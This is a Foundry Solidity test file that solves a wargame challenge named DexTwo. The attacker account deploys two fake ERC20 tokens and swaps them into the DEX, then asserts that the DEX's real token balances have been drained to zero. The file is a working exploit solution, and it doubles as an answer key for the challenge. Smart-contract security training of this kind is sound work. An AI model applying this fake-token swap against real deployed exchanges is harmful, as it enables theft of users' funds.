// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";
import {DeployDexTwoScript} from "@script/23_DeployDexTwo.s.sol";

import {DexTwo} from "@main/23_DexTwo.sol";
import {TokenAttacker} from "@main/23_ERC20Attacker.sol";

contract DexTwoTest is Test, DeployDexTwoScript {
    string mnemonic = "test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
    uint256 attackerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 2); //  address = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC

    address deployer = vm.addr(deployerPrivateKey);
    address attacker = vm.addr(attackerPrivateKey);

    TokenAttacker tokenOneAttacker;
    TokenAttacker tokenTwoAttacker;

    function setUp() public {
        vm.label(deployer, "Deployer");
        vm.label(attacker, "Attacker");

        // vm.deal(deployer, 1 ether);
        // vm.deal(attacker, 1 ether);

        DeployDexTwoScript.run();
    }

    modifier beforeEach() {
        vm.startPrank(deployer);

        dextwoChallenge.setTokens(address(tokenOne), address(tokenTwo));
        tokenOne.approve(address(dextwoChallenge), 100);
        tokenTwo.approve(address(dextwoChallenge), 100);

        dextwoChallenge.add_liquidity(address(tokenOne), 100);
        dextwoChallenge.add_liquidity(address(tokenTwo), 100);

        tokenOne.transfer(attacker, 10);
        tokenTwo.transfer(attacker, 10);

        assertEq(tokenOne.balanceOf(address(dextwoChallenge)), 100);
        assertEq(tokenTwo.balanceOf(address(dextwoChallenge)), 100);

        assertEq(tokenOne.balanceOf(attacker), 10);
        assertEq(tokenTwo.balanceOf(attacker), 10);

        vm.stopPrank();
        _;
    }

    function test_isSolved() public beforeEach {
        vm.startPrank(attacker);

        tokenOneAttacker = new TokenAttacker(
            address(dextwoChallenge),
            "Token 1 Attacker",
            "TKN1A",
            100
        );
        tokenTwoAttacker = new TokenAttacker(
            address(dextwoChallenge),
            "Token 2 Attacker",
            "TKN2A",
            100
        );

        dextwoChallenge.swap(address(tokenOneAttacker), address(tokenOne), 100);
        dextwoChallenge.swap(address(tokenTwoAttacker), address(tokenTwo), 100);

        assertEq(tokenOne.balanceOf(address(dextwoChallenge)), 0);
        assertEq(tokenTwo.balanceOf(address(dextwoChallenge)), 0);

        vm.stopPrank();
    }
}
